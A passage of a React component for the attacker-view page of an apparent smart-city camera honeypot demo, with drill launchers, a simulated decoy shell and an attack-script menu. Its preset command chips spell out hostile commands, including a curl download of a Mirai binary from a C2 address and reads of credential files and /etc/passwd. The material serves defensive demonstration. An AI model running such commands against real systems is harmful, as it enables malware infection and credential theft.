      appendTerminal(`[+] Case awaiting 2nd custodian signature (Forensics Officer) in Campaigns tab.`, 'green')
      setStatusMessage(`Drill B Active: Case CASE-2026-001 awaiting 2nd custodian vote!`)
      addToast(
        'Drill B Initialized',
        'Honeypot breached & honeytoken tripped. Case CASE-2026-001 opened for Shamir quorum.',
        'danger'
      )
    } catch (err: any) {
      appendTerminal(`[-] Drill B execution error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  const handleLaunchDrillC = async () => {
    setIsActionPending(true)
    appendTerminal(`./run_drill.sh --scenario drill-c`, 'cmd', 'root@kali:~# ')
    appendTerminal(`[*] LAUNCHING DRILL C: Multi-Group Campaign Clustering & Attacker Adaptation`, 'dim')
    try {
      await fetch(`${API_BASE}/intel/drill/drill-c`, { method: 'POST' })
      appendTerminal(`[*] Botnet variant A (CMP-001), SCADA RTU attack (CMP-002), Recon probe (CMP-003).`, 'dim')
      appendTerminal(`[+] Graph Clustering Engine resolved adapted attacker IP rotation via shared C2 address!`, 'green')
      appendTerminal(`[+] Threat graph clustered into 3 distinct campaigns with plain-language evidence.`, 'cyan')
      setStatusMessage(`Drill C Active: Campaign graph clustered with plain-language evidence!`)
      addToast(
        'Drill C Initialized',
        'Multi-group threat clustering active: Correlated attacker rotation via C2.',
        'review'
      )
    } catch (err: any) {
      appendTerminal(`[-] Drill C execution error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  const handleLaunchFederation = async () => {
    setIsActionPending(true)
    appendTerminal(`./broadcast_threat_contract.sh --campaign CMP-001`, 'cmd', 'root@kali:~# ')
    appendTerminal(`[*] Generating cryptographic threat digest: keccak256(CMP-001 | C2:185.220.101.5)...`, 'dim')
    try {
      const res = await fetch(`${API_BASE}/intel/federation/simulate-city-b-attack`, { method: 'POST' })
      if (res.ok) {
        appendTerminal(`[+] Attack hash broadcast to Smart City Threat Registry contract (0x71C...3a9).`, 'green')
        appendTerminal(`[+] City B (Cyber-Bengaluru) sensor node read contract event ThreatRegistered.`, 'cyan')
        appendTerminal(`[!] City B pre-emptively blacklisted C2 IP before any attack packet hit their sentries!`, 'alert')
        setStatusMessage(`Cross-city defense verified: Threat neutralized pre-emptively!`)
        addToast(
          'Cross-City Federation',
          'Threat hash broadcast on smart contract. City B pre-emptively immunized.',
          'production'
        )
      }
    } catch (err: any) {
      appendTerminal(`[-] Federation execution error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  // ---------------------------------------------------------------------------
  // Interactive Terminal Custom Input & CLI Dispatcher
  // Sends EXACT commands to /api/decoy/simulate/command and displays EXACT outputs
  // ---------------------------------------------------------------------------

  const resolvePath = (base: string, p: string): string => {
    if (!p) return base
    if (p.startsWith('/')) {
      return p.replace(/\/+/g, '/').replace(/\/$/, '') || '/'
    }
    const combined = base === '/' ? `/${p}` : `${base}/${p}`
    const parts = combined.split('/').filter(Boolean)
    const stack: string[] = []
    for (const part of parts) {
      if (part === '.') continue
      if (part === '..') {
        if (stack.length > 0) stack.pop()
      } else {
        stack.push(part)
      }
    }
    return '/' + stack.join('/')
  }

  const handleCliSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!cliInput.trim()) return

    const rawCmd = cliInput.trim()
    setCliInput('')

    const activePrompt = getPrompt()
    appendTerminal(rawCmd, 'cmd', activePrompt)

    const cmd = rawCmd.toLowerCase()

    // 1. CLEAR
    if (cmd === 'clear') {
      setTerminalLines(INITIAL_SSH_BANNER_LINES)
      return
    }

    // 2. EXIT / LOGOUT
    if (cmd === 'exit' || cmd === 'logout' || cmd === 'quit') {
      setIsConnected(false)
      appendTerminal('Connection to 192.168.1.50 closed by foreign host.\n', 'output')
      return
    }

    // 3. RECONNECT / SSH
    if (!isConnected) {
      if (cmd.startsWith('ssh') || cmd === 'connect' || cmd === 'reconnect') {
        setIsConnected(true)
        setCurrentDir('/root')
        setTerminalLines((prev) => [...prev, ...INITIAL_SSH_BANNER_LINES])
        return
      }
      appendTerminal(`sh: ${rawCmd}: command not found (Session closed. Type 'ssh root@192.168.1.50 -p 2222' to connect)\n`, 'output')
      return
    }

    // 4. Execute via REAL DECOY BACKEND (/api/decoy/simulate/command)
    try {
      const res = await fetch(`${API_BASE}/api/decoy/simulate/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: sessionId,
          command: rawCmd,
          source_ip: attackerIp,
        }),
      })

      if (res.ok) {
        const data = await res.json()
        if (data.current_dir) {
          setCurrentDir(data.current_dir)
        }
        if (data.honeytoken_hit || data.event?.honeytoken_hit) {
          setHoneytokenTripped(true)
          setHostilityScore(9.8)
        }

        const out = data.output !== undefined ? String(data.output) : ''

        // Exact output rendering from decoy
        if (out.includes('NEVER GONNA GIVE YOU UP') || out.includes('PHANTOM TWIN SANDBOX')) {
          appendTerminal(out, 'rickroll')
        } else if (out.trim()) {
          appendTerminal(out, 'output')
        }
        return
      }
    } catch {
      // Backend temporarily unavailable -> proceed to offline fallback mirror
    }

    // 5. Offline Fallback Mirror (Identical behavior to decoy.py without leaks)
    const tokens = rawCmd.split(/\s+/)
    const verb = tokens[0]?.toLowerCase() || ''
    const args = tokens.slice(1)

    if (verb === 'pwd') {
      appendTerminal(`${currentDir}\n`, 'output')
    } else if (verb === 'whoami') {
      appendTerminal(`root\n`, 'output')
    } else if (verb === 'id') {
      appendTerminal(`uid=0(root) gid=0(root) groups=0(root)\n`, 'output')
    } else if (verb === 'uname' || rawCmd.startsWith('uname')) {
      appendTerminal(`Linux aegis-smartcam-01 5.10.0-arm64 #1 PREEMPT aarch64 GNU/Linux\n`, 'output')
    } else if (verb === 'ps' || verb.startsWith('ps')) {
      appendTerminal(
        'PID   USER     COMMAND\n    1 root     /sbin/init\n  214 root     /usr/bin/aegis-sentry --camera cam-smart-04\n  302 root     /usr/sbin/dropbear -p 2222\n  412 root     /bin/sh\n',
        'output'
      )
    } else if (verb === 'ifconfig' || verb === 'ip') {
      appendTerminal(
        'eth0      Link encap:Ethernet  HWaddr 00:1A:79:B4:9C:12\n          inet addr:192.168.1.50  Bcast:192.168.1.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n',
        'output'
      )
    } else if (verb === 'cd') {
      const target = args[0] || '/root'
      const resolved = resolvePath(currentDir, target)
      if (VIRTUAL_FS_MIRROR[resolved] && Array.isArray(VIRTUAL_FS_MIRROR[resolved])) {
        setCurrentDir(resolved)
      } else {
        appendTerminal(`cd: ${target}: No such file or directory\n`, 'output')
      }
    } else if (verb === 'ls') {
      const pathArg = args.find((a) => !a.startsWith('-')) || ''
      const target = resolvePath(currentDir, pathArg)
      const isLong = args.some((a) => a.startsWith('-') && a.includes('l'))
      if (VIRTUAL_FS_MIRROR[target]) {
        const node = VIRTUAL_FS_MIRROR[target]
        if (Array.isArray(node)) {
          if (isLong) {
            const lines = ['total 32', 'drwxr-xr-x 2 root root 4096 Oct 25 04:00 .', 'drwxr-xr-x 8 root root 4096 Oct 25 03:30 ..']
            for (const item of node) {
              const fullSub = resolvePath(target, item)
              const subNode = VIRTUAL_FS_MIRROR[fullSub]
              if (Array.isArray(subNode)) {
                lines.push(`drwxr-xr-x 2 root root 4096 Oct 25 04:00 ${item}`)
              } else {
                const sz = typeof subNode === 'string' ? subNode.length : 1024
                lines.push(`-rw-r--r-- 1 root root ${String(sz).padStart(5, ' ')} Oct 25 04:01 ${item}`)
              }
            }
            appendTerminal(lines.join('\n') + '\n', 'output')
          } else {
            appendTerminal(node.join('  ') + '\n', 'output')
          }
        } else {
          appendTerminal(`${target.split('/').pop()}\n`, 'output')
        }
      } else {
        appendTerminal(`ls: cannot access '${pathArg}': No such file or directory\n`, 'output')
      }
    } else if (['cat', 'head', 'tail', 'more', 'less'].includes(verb)) {
      const fileArg = args.find((a) => !a.startsWith('-')) || ''
      const target = resolvePath(currentDir, fileArg)
      if (VIRTUAL_FS_MIRROR[target]) {
        const content = VIRTUAL_FS_MIRROR[target]
        if (typeof content === 'string') {
          if (content.includes(HONEYTOKEN_MARKER)) {
            setHoneytokenTripped(true)
            setHostilityScore(9.8)
            appendTerminal(RICKROLL_PAYLOAD_DECOY, 'rickroll')
          } else {
            appendTerminal(content, 'output')
          }
        } else {
          appendTerminal(`${verb}: ${fileArg}: Is a directory\n`, 'output')
        }
      } else {
        appendTerminal(`${verb}: ${fileArg}: No such file or directory\n`, 'output')
      }
    } else if (['curl', 'wget', 'tftp'].includes(verb)) {
      appendTerminal('Connected to remote host... File saved.\n', 'output')
    } else if (verb === 'echo') {
      appendTerminal(`${args.join(' ')}\n`, 'output')
    } else if (verb === 'chmod') {
      // silent success
    } else if (verb.startsWith('./') || ['sh', 'bash'].includes(verb)) {
      const prog = args[0] || verb
      appendTerminal(`[+] Process ${prog.split('/').pop()} started (PID 1421). Worker running in background.\n`, 'output')
    } else if (verb === 'help') {
      appendTerminal(
        'AegisOS SmartCam Diagnostic Shell\nSupported commands: ls, cd, cat, head, tail, more, less, pwd, whoami, id, uname, ps, ifconfig, curl, wget, echo, chmod, help, exit\n',
        'output'
      )
    } else {
      appendTerminal(`sh: ${verb}: command not found\n`, 'output')
    }
  }

  const handlePresetCmd = (cmd: string) => {
    setCliInput(cmd)
  }

  const frameUrl = `${API_BASE}/api/cameras/${selectedCam}/frame?t=${frameTimestamp}`

  return (
    <div className="page-container hacker-container" id="page-hacker-pov">
      {/* 1. ATTACKER HUD TOP BANNER */}
      <div className="attacker-hud-banner">
        <div className="hud-top-row">
          <div className="hud-identity">
            <div className="hud-avatar-skull">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="9" cy="12" r="1.5" />
                <circle cx="15" cy="12" r="1.5" />
                <path d="M8 20v2h8v-2" />
                <path d="M12.5 17l-.5-1-.5 1" />
                <path d="M16 20a3 3 0 0 0 3-3V9a7 7 0 0 0-14 0v8a3 3 0 0 0 3 3h8z" />
              </svg>
            </div>
            <div className="hud-meta">
              <h2>
                <span>Hacker POV — Red Team Attack Pod</span>
                <Badge variant="danger">LIVE EXPLOIT CONSOLE</Badge>
              </h2>
              <div className="hud-meta-details">
                <span><strong>Origin:</strong> {attackerIp}</span>
                <span>•</span>
                <span><strong>C2 Server:</strong> 185.220.101.5:8080</span>
                <span>•</span>
                <span><strong>Target:</strong> Smart City Subnet (192.168.1.0/24)</span>
              </div>
            </div>
          </div>
        </div>

        {/* Integrated StatCards */}
        <div className="hud-stats-grid">
          <StatCard
            label="Exploit Pod Status"
            value="ARMED & ACTIVE"
            subtitle="Red Team Console"
            variant="danger"
            icon="⚡"
          />
          <StatCard
            label="Target Camera Node"
            value={selectedCam.toUpperCase()}
            subtitle={getCamMeta(selectedCam).name}
            variant="review"
            icon="📷"
          />
          <StatCard
            label="Defense Safeguard"
            value="ZERO RAW INGEST"
            subtitle="Hardware YuNet Blur"
            variant="success"
            icon="🛡️"
          />
          <StatCard
            label="Decoy Routing"
            value={honeytokenTripped ? "STICKY QUARANTINE" : "DECOY TRAPPED"}
            subtitle={`Hostility: ${hostilityScore.toFixed(1)} / 10`}
            variant="deception"
            icon="🪤"
          />
        </div>

        {/* Cross-Tab Jump Bar */}
        <div className="hud-nav-links">
          <span className="hud-nav-title">Inspect Live Impact Across System:</span>
          <button type="button" className="btn-jump-tab" onClick={() => navigateTo('city')}>
            <span>🏙️</span>
            <span>Living City Observatory</span>
          </button>
          <button type="button" className="btn-jump-tab" onClick={() => navigateTo('cameras')}>
            <span>📷</span>
            <span>Edge Sentry Cameras</span>
          </button>
          <button type="button" className="btn-jump-tab" onClick={() => navigateTo('decoy')}>
            <span>🪤</span>
            <span>Phantom Twin Decoy</span>
          </button>
          <button type="button" className="btn-jump-tab" onClick={() => navigateTo('evidence')}>
            <span>🛡️</span>
            <span>Threat Intel &amp; Quorum</span>
          </button>
          {statusMessage && (
            <span style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: 'var(--accent-review)', marginLeft: 'auto', fontWeight: 600 }}>
              {statusMessage}
            </span>
          )}
        </div>
      </div>

      {/* 2. MAIN SPLIT GRID */}
      <div className="hacker-main-grid">
        {/* LEFT COLUMN: SPOTLIGHT "BLIND, FETCH & FREEZE" */}
        <div className="hacker-card hacker-card-accent-red">
          <div className="hacker-card-header">
            <div className="hacker-card-title">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" color="#f43f5e">
                <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
              </svg>
              <span>Tactical Operations: Blind, Fetch &amp; Freeze</span>
            </div>
            <span className="hacker-card-badge badge-crimson">Physical &amp; Stream Attacks</span>
          </div>

          <div className="hacker-card-body">
            {/* Target Node Selector */}
            <div className="target-cam-picker">
              <span className="picker-label">Target Camera Sentry:</span>
              <div className="cam-select-buttons">
                {['cam_01', 'cam_02', 'cam_03', 'cam_04', 'cam_05'].map((cid) => {
                  const node = cameras.find((c) => c.camera_id === cid)
                  return (
                    <button
                      key={cid}
                      type="button"
                      className={`btn-cam-select ${selectedCam === cid ? 'active' : ''}`}
                      onClick={() => handleSelectCam(cid)}
                    >
                      {cid.toUpperCase()}
                      {node?.status === 'anomaly' && ' ⚠️'}
                    </button>
                  )
                })}
              </div>
            </div>

            {/* Target Live Stream Monitor */}
            <div className="target-video-box">
              <img
                src={frameUrl}
                alt={`Target camera feed ${selectedCam}`}
                onLoad={scheduleNextFrame}
                onError={scheduleNextFrame}
              />
              <div className="target-video-overlay">
                <div className="target-hud-tag">
                  TARGET: {selectedCam.toUpperCase()} // 16 FPS // YUNET
                </div>
                {isCurrentAnomaly ? (
                  <div className="target-anomaly-alert">
                    ⚠️ ANOMALY: {currentCamInfo?.last_event?.toUpperCase() || 'TAMPER DETECTED'}
                  </div>
                ) : (
                  <div className="target-hud-tag" style={{ color: '#34d399', borderColor: 'rgba(52, 211, 153, 0.4)' }}>
                    FEED BLURRED (PRIVACY LOCKED)
                  </div>
                )}
              </div>
            </div>

            {/* Tactical 3-Buttons Grid */}
            <div className="tactical-actions-grid">
              {/* Button 1: BLIND */}
              <button
                type="button"
                className="tactical-btn btn-blind"
                onClick={handleBlind}
                disabled={isActionPending}
                title="Direct optical laser dazzler / paint cover at camera lens (Brightness drop >= 60%)"
              >
                <span style={{ fontSize: '1.25rem' }}>🕶️</span>
                <span className="tactical-btn-title">BLIND</span>
                <span className="tactical-btn-sub">Optical Sensor Dazzle</span>
              </button>

              {/* Button 2: FREEZE */}
              <button
                type="button"
                className="tactical-btn btn-freeze"
                onClick={handleFreeze}
                disabled={isActionPending}
                title="Inject video buffer loop hang into camera feed"
              >
                <span style={{ fontSize: '1.25rem' }}>❄️</span>
                <span className="tactical-btn-title">FREEZE</span>
                <span className="tactical-btn-sub">Buffer Loop Replay</span>
              </button>

              {/* Button 3: FETCH */}
              <button
                type="button"
                className="tactical-btn btn-fetch"
                onClick={handleFetch}
                disabled={isActionPending}
                title="Attempt unauthorized raw stream sniff or encrypted crop exfiltration"
              >
                <span style={{ fontSize: '1.25rem' }}>📥</span>
                <span className="tactical-btn-title">FETCH</span>
                <span className="tactical-btn-sub">Intercept Footage</span>
              </button>
            </div>

            {/* Recover Bar if Anomaly Active */}
            {isCurrentAnomaly && (
              <div className="recover-strip">
                <span>Current state: <strong>{currentCamInfo?.last_event}</strong></span>
                <button
                  type="button"
                  className="btn-recover-anomaly"
                  onClick={handleRecover}
                  disabled={isActionPending}
                >
                  Withdraw Exploit (Recover)
                </button>
              </div>
            )}

            {/* Fetch Proof / Defense Evidence Box */}
            {fetchEvidence && (
              <div className="fetch-verdict-box">
                <div className="fetch-verdict-header">
                  <span style={{ color: '#fb7185' }}>ATTACK OUTCOME: {fetchEvidence.security_verdict}</span>
                  <span style={{ color: '#38bdf8', fontFamily: 'var(--font-mono)' }}>
                    Crops: {fetchEvidence.stored_records_count}
                  </span>
                </div>
                <div style={{ fontSize: '0.75rem', color: '#cbd5e1', lineHeight: '1.4' }}>
                  <strong>Zero Raw Guarantee:</strong> {fetchEvidence.privacy_guarantee}
                  <br />
                  <strong>Key Protection:</strong> {fetchEvidence.key_status}
                </div>
                {fetchEvidence.ciphertext_samples?.length > 0 && (
                  <div>
                    <div style={{ fontSize: '0.7rem', color: '#64748b', marginBottom: '0.25rem' }}>
                      Raw Intercepted Bytes (AES-256-GCM Ciphertext only):
                    </div>
                    <div className="hex-dump-preview">
                      {fetchEvidence.ciphertext_samples[0].ciphertext_hex_preview}
                    </div>
                  </div>
                )}
                {fetchEvidence.unauthorized_escrow_audit && (
                  <div style={{ borderTop: '1px dashed rgba(255, 255, 255, 0.1)', paddingTop: '0.5rem', fontSize: '0.725rem' }}>
                    <span style={{ color: '#f43f5e', fontWeight: 700 }}>
                      🛡️ Cryptographic Audit Ledger Entry (Tamper-Proof Block):
                    </span>
                    <div style={{ fontFamily: 'var(--font-mono)', color: '#94a3b8', marginTop: '0.2rem' }}>
                      Action: {fetchEvidence.unauthorized_escrow_audit.action} | Actor: {fetchEvidence.unauthorized_escrow_audit.actor}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Integrated Smart City Mesh Topology Locator */}
            <CityMiniMap highlightDeviceId={selectedCam === 'cam_01' ? 'CAM-01' : undefined} />
          </div>
        </div>

        {/* RIGHT COLUMN: RUNNING SCRIPTS & CROSS-TAB DEMO SCENARIOS */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
          {/* Top Card: Running Scripts of Hackers */}
          <div className="hacker-card hacker-card-accent-amber">
            <div className="hacker-card-header">
              <div className="hacker-card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" color="#fbbf24">
                  <polyline points="4 17 10 11 4 5" />
                  <line x1="12" y1="19" x2="20" y2="19" />
                </svg>
                <span>Running Scripts of Hackers (Exploit Arsenal)</span>
              </div>
              <span className="hacker-card-badge badge-amber">Interactive Payloads</span>
            </div>

            <div className="hacker-card-body">
              <div className="script-library-list">
                {/* Script 1 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">1. Network Recon Sweep</span>
                      <span className="script-tag">scan_recon.sh</span>
                    </div>
                    <span className="script-desc">
                      Nmap stealth SYN sweep on ports 22, 80, 554, 1883, 2222 across city camera subnet.
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptRecon} disabled={isActionPending}>
                    Execute Recon
                  </button>
                </div>

                {/* Script 2 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">2. IoT Brute-Force &amp; Credential Stuffing</span>
                      <span className="script-tag">bruteforce_iot.py</span>
                    </div>
                    <span className="script-desc">
                      Stuffs default camera passwords (`admin:admin`, `root:123456`) &rarr; Trapped in Decoy!
                    </span>
                    <span className="script-target-link" onClick={() => navigateTo('decoy')}>
                      👉 View Decoy Keystroke Mirror
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptBruteforce} disabled={isActionPending}>
                    Launch Attack
                  </button>
                </div>

                {/* Script 3 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">3. Mirai Malware Dropper</span>
                      <span className="script-tag">deploy_dropper.sh</span>
                    </div>
                    <span className="script-desc">
                      Uploads downloader querying C2 `185.220.101.5:8080/mirai.arm7` &rarr; Quarantined!
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptDropper} disabled={isActionPending}>
                    Drop Payload
                  </button>
                </div>

                {/* Script 4 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">4. Honeytoken Bait Tripwire</span>
                      <span className="script-tag">cat_creds.sh</span>
                    </div>
                    <span className="script-desc">
                      Touches bait `credentials.conf` &rarr; Rickroll reverse payload + hostility score &gt; 8.0!
                    </span>
                    <span className="script-target-link" onClick={() => navigateTo('evidence')}>
                      👉 View Shamir Quorum Unlock Case
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptHoneytoken} disabled={isActionPending}>
                    Trip Bait
                  </button>
                </div>

                {/* Script 5 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">5. SCADA RTU Grid Exploit</span>
                      <span className="script-tag">modbus_trip.py</span>
                    </div>
                    <span className="script-desc">
                      Injects breaker trip on 192.0.2.140 &rarr; 3.5x blast radius multiplier in Intel!
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptScada} disabled={isActionPending}>
                    Trip SCADA
                  </button>
                </div>

                {/* Script 6 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">6. C2 Rotation &amp; Evasive Pivot</span>
                      <span className="script-tag">adaptive_pivot.sh</span>
                    </div>
                    <span className="script-desc">
                      Rotates IP to 203.0.113.88 with reused C2 &rarr; Intel engine correlates via C2!
                    </span>
                    <span className="script-target-link" onClick={() => navigateTo('evidence')}>
                      👉 View Graph Clustering
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptAdapt} disabled={isActionPending}>
                    Pivot Attacker
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* Bottom Card: Live Demo Scripts Integrated Across Tabs */}
          <div className="hacker-card">
            <div className="hacker-card-header">
              <div className="hacker-card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" color="#38bdf8">
                  <polygon points="5 3 19 12 5 21 5 3" />
                </svg>
                <span>Live Demo Scripts Integrated Across Tabs</span>
              </div>
              <span className="hacker-card-badge badge-cyan">Full Master Drills</span>
            </div>

            <div className="hacker-card-body">
              <div className="cross-tab-scenarios-grid">
                {/* Scenario 1 */}
                <div className="scenario-card">
                  <div className="scenario-top">
                    <span className="scenario-title">
                      <span style={{ color: '#38bdf8' }}>Drill A:</span> False Positive Safeguard
                    </span>
                    <span className="scenario-desc">
                      Pedestrian flagged. Stream stays blurred. Attacker attempts unmasking &rarr; BLOCKED 403 &amp; logged.
                    </span>
                  </div>
                  <div className="scenario-actions">
                    <button type="button" className="btn-launch-drill" onClick={handleLaunchDrillA} disabled={isActionPending}>
                      Run Drill A
                    </button>
                    <button type="button" className="btn-jump-tab" onClick={() => navigateTo('evidence')}>
                      Inspect Audit Chain →
                    </button>
                  </div>
                </div>

                {/* Scenario 2 */}
                <div className="scenario-card">
                  <div className="scenario-top">
                    <span className="scenario-title">
                      <span style={{ color: '#f59e0b' }}>Drill B:</span> Honeypot &amp; Quorum Unlock
                    </span>
                    <span className="scenario-desc">
                      Attacker trips honeytoken. Hostility &gt; 8.0. Case CASE-2026-001 opens for Shamir 2-of-3 quorum.
                    </span>
                  </div>
                  <div className="scenario-actions">
                    <button type="button" className="btn-launch-drill" onClick={handleLaunchDrillB} disabled={isActionPending}>
                      Run Drill B
                    </button>
                    <button type="button" className="btn-jump-tab" onClick={() => navigateTo('evidence')}>
                      Vote in Quorum →
                    </button>
                  </div>
                </div>

                {/* Scenario 3 */}
                <div className="scenario-card">
                  <div className="scenario-top">
                    <span className="scenario-title">
                      <span style={{ color: '#fb7185' }}>Drill C:</span> Multi-Group Campaign Cluster
                    </span>
                    <span className="scenario-desc">
                      3 botnet clusters hit infrastructure. Intel correlates adapted attacker IP rotation via C2.
                    </span>
                  </div>
                  <div className="scenario-actions">
                    <button type="button" className="btn-launch-drill" onClick={handleLaunchDrillC} disabled={isActionPending}>
                      Run Drill C
                    </button>
                    <button type="button" className="btn-jump-tab" onClick={() => navigateTo('evidence')}>
                      View Cluster Graph →
                    </button>
                  </div>
                </div>

                {/* Scenario 4 */}
                <div className="scenario-card">
                  <div className="scenario-top">
                    <span className="scenario-title">
                      <span style={{ color: '#34d399' }}>Federation:</span> Cross-City Threat Share
                    </span>
                    <span className="scenario-desc">
                      Campaign hash published on chain. City B reads smart contract and neutralizes attacker pre-emptively!
                    </span>
                  </div>
                  <div className="scenario-actions">
                    <button type="button" className="btn-launch-drill" onClick={handleLaunchFederation} disabled={isActionPending}>
                      Simulate City B
                    </button>
                    <button type="button" className="btn-jump-tab" onClick={() => navigateTo('evidence')}>
                      Inspect Registry →
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* 3. INTERACTIVE LIVE ATTACK TERMINAL (CLI) */}
      <div className="attack-terminal-card">
        <div className="terminal-header">
          <div className="terminal-title-dots">
            <span className="terminal-dot dot-red" />
            <span className="terminal-dot dot-yellow" />
            <span className="terminal-dot dot-green" />
            <span className="terminal-title-text">
              {isConnected
                ? 'SSH-2.0-AsyncSSH_2.24.1 // root@192.168.1.50:2222 (AegisOS SmartCam IoT Linux 5.10.0-arm64)'
                : 'root@kali-edge-exploit: /opt/aegis-strike (bash)'}
            </span>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
            <span className={`connection-badge ${isConnected ? 'connected' : 'disconnected'}`}>
              {isConnected ? '● ACTIVE SSH TTY' : '○ DISCONNECTED'}
            </span>
            <span style={{ fontSize: '0.7rem', color: '#64748b', fontFamily: 'var(--font-mono)' }}>
              Port 2222 Decoy Shell
            </span>
          </div>
        </div>

        <div className="terminal-body">
          {terminalLines.map((line, idx) => (
            <div key={idx} className={`terminal-line terminal-line-${line.type || 'output'}`}>
              {line.type === 'cmd' ? (
                <div>
                  <span className="prompt">{line.prompt || getPrompt()}</span>
                  <span>{line.text}</span>
                </div>
              ) : line.type === 'rickroll' ? (
                <div style={{ whiteSpace: 'pre', fontFamily: 'var(--font-mono)', overflowX: 'auto' }}>
                  {line.text}
                </div>
              ) : (
                line.text
              )}
            </div>
          ))}
          <div ref={terminalEndRef} />
        </div>

        {/* Quick Command Chips */}
        <div className="terminal-quick-chips">
          <span style={{ fontSize: '0.675rem', color: '#64748b', marginRight: '0.2rem' }}>Target IoT Commands:</span>
          {[
            'uname -a',
            'ls -la /etc/camera',
            'cat /etc/camera/credentials.conf',
            'cat /emergency_token.cfg',
            'ls /root/keys',
            'cat /root/keys/vault_token.key',
            'whoami',
            'id',
            'pwd',
            'ps',
            'ifconfig',
            'cat /etc/passwd',
            'cat /etc/issue',
            'cat /proc/version',
            'curl http://185.220.101.5:8080/mirai.arm7',
          ].map((cmd) => (
            <button key={cmd} type="button" className="quick-chip" onClick={() => handlePresetCmd(cmd)}>
              {cmd}
            </button>
          ))}
        </div>

        {/* Input prompt */}
        <form className="terminal-input-bar" onSubmit={handleCliSubmit}>
          <span className="terminal-prompt-label">{getPrompt()}</span>
          <input
            type="text"
            className="terminal-input"
            value={cliInput}
            onChange={(e) => setCliInput(e.target.value)}
            placeholder={
              isConnected
                ? 'Type IoT shell command and press Enter (e.g. ls /etc/camera, cat /etc/camera/credentials.conf)...'
                : "Session closed. Type 'ssh root@192.168.1.50 -p 2222' to reconnect..."
            }
          />
          <button type="submit" className="btn-run-script" style={{ padding: '0.25rem 0.65rem', fontSize: '0.7rem' }}>
            Send
          </button>
        </form>
      </div>

      {/* 4. DEFENDER SURVEILLANCE & SILENT TELEMETRY (What Aegis Detects in Real-Time) */}
      <div className="defender-backchannel-card">
        <div className="defender-backchannel-header">
          <div className="defender-backchannel-title">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" color="#38bdf8">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
            <span>Aegis Sentry Backchannel // Real-Time Defense Intercept &amp; Telemetry</span>
          </div>
          <span style={{ fontSize: '0.7rem', color: '#94a3b8', fontFamily: 'var(--font-mono)' }}>
            Direct Module Wire (edge.py &harr; decoy.py &harr; intel.py &harr; escrow.py)
          </span>
        </div>

        <div className="defender-backchannel-grid">
          <div className="backchannel-item">
            <span className="backchannel-label">Attacker Source IP</span>
            <span className="backchannel-val" style={{ color: '#fb7185' }}>{attackerIp}</span>
          </div>
          <div className="backchannel-item">
            <span className="backchannel-label">Decoy Session ID</span>
            <span className="backchannel-val" style={{ color: '#38bdf8' }}>{sessionId}</span>
          </div>
          <div className="backchannel-item">
            <span className="backchannel-label">Gateway Perimeter Route</span>
            <span className="backchannel-val" style={{ color: '#34d399' }}>DECOY (Sticky Isolation)</span>
          </div>
          <div className="backchannel-item">
            <span className="backchannel-label">Heuristic Threat Score</span>
            <span className="backchannel-val" style={{ color: hostilityScore >= 8.0 ? '#f43f5e' : '#fbbf24' }}>
              {hostilityScore.toFixed(1)} / 10.0 {hostilityScore >= 8.0 ? '🚨 [HOSTILE]' : '⚠️ [SUSPICIOUS]'}
            </span>
          </div>
          <div className="backchannel-item">
            <span className="backchannel-label">Honeytoken Canary Tripwire</span>
            <span className="backchannel-val" style={{ color: honeytokenTripped ? '#f43f5e' : '#38bdf8' }}>
              {honeytokenTripped ? '🚨 TRIPPED: credentials.conf' : '🛡️ ARMED (5 Depth Layers)'}
            </span>
          </div>
          <div className="backchannel-item">
            <span className="backchannel-label">Quarantined Payload SHA-256</span>
            <span className="backchannel-val" style={{ color: '#a78bfa' }}>
              {quarantinedHash ? `${quarantinedHash.substring(0, 16)}...` : 'No file upload yet'}
            </span>
          </div>
          <div className="backchannel-item">
            <span className="backchannel-label">Extracted C2 Indicator</span>
            <span className="backchannel-val" style={{ color: '#fbbf24' }}>
              {candidateC2 || '185.220.101.5:8080'}
            </span>
          </div>
          <div className="backchannel-item">
            <span className="backchannel-label">Break-Glass Escrow Gate</span>
